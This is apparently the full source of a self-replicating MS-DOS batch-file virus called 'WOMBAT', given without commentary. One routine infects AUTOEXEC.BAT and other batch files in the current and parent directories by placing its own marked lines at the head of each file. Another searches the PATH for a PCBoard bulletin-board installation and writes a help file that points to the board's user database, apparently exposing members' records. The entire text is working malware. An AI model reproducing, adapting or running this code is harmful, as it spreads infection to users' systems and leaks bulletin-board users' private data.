GOTO WOMBAT_%WOMBAT%
:WOMBAT_INFECT_ME
FIND "WOMBAT" %1>NUL
IF ERRORLEVEL==1 GOTO WOMBAT_DO_INFECT
GOTO ABSOLUTE_END %_WOMBAT_%
:WOMBAT_DO_INFECT
IF EXIST %TEMP%\_WOMBAT_.TMP DEL %TEMP%\_WOMBAT_.TMP
COPY %1 %TEMP%\_WOMBAT_.TMP>NUL
TYPE %0|FIND "WOMBAT">%1
TYPE %TEMP%\_WOMBAT_.TMP>>%1
DEL %TEMP%\_WOMBAT_.TMP
ECHO. >>%1%_WOMBAT_%
ECHO :ABSOLUTE_END>>%1%_WOMBAT_%
GOTO ABSOLUTE_END %_WOMBAT_%
:WOMBAT_
SET MAIN_WOMBAT=%0
IF NOT EXIST %MAIN_WOMBAT% SET MAIN_WOMBAT=%MAIN_WOMBAT%.BAT
IF NOT EXIST %MAIN_WOMBAT% SET MAIN_WOMBAT=AUTOEXEC.BAT
SET WOMBAT_TAIL=
:WOMBAT_FIX_TAIL
IF .%1==. GOTO WOMBAT_GET_INFECT
SET WOMBAT_TAIL=%WOMBAT_TAIL% %1
SHIFT %_WOMBAT_%
GOTO WOMBAT_FIX_TAIL
:WOMBAT_GET_INFECT
SET WOMBAT=INFECT_ME
FOR %%C IN (C:\AUTOEXEC.BAT *.BAT ..\*.BAT) DO CALL %MAIN_WOMBAT% %%C
SET WOMBAT=END
%MAIN_WOMBAT% %WOMBAT_TAIL%
:WOMBAT_TROJANIZE
IF .%1==. GOTO ABSOLUTE_END  %_WOMBAT_%
SHIFT %_WOMBAT_%
IF NOT EXIST %0\PCBOARD.EXE GOTO WOMBAT_TROJANIZE
ECHO %%%0\MAIN\USERS>%0\HELP\WOMBAT
GOTO ABSOLUTE_END %_WOMBAT_%
:WOMBAT_END
SET WOMBAT=TROJANIZE
CALL %MAIN_WOMBAT% %PATH%
SET WOMBAT=
SET WOMBAT_TAIL=
SET MAIN_WOMBAT=
                             
 
:ABSOLUTE_END
